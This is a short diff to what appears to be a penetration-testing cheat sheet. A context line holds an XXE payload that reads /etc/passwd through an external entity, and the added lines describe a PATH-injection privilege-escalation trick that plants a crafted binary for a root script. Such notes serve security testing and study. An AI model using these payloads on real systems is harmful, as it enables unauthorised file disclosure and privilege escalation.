@@ -190,3 +190,7 @@ XXE
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>  
            <bugreport>  
            <title>&xxe;</title>
+
+PATH INJECTION VULN
+export PATH=$(pwd):$PATH
+and put your own crafted binary when it is called directly in a script as root
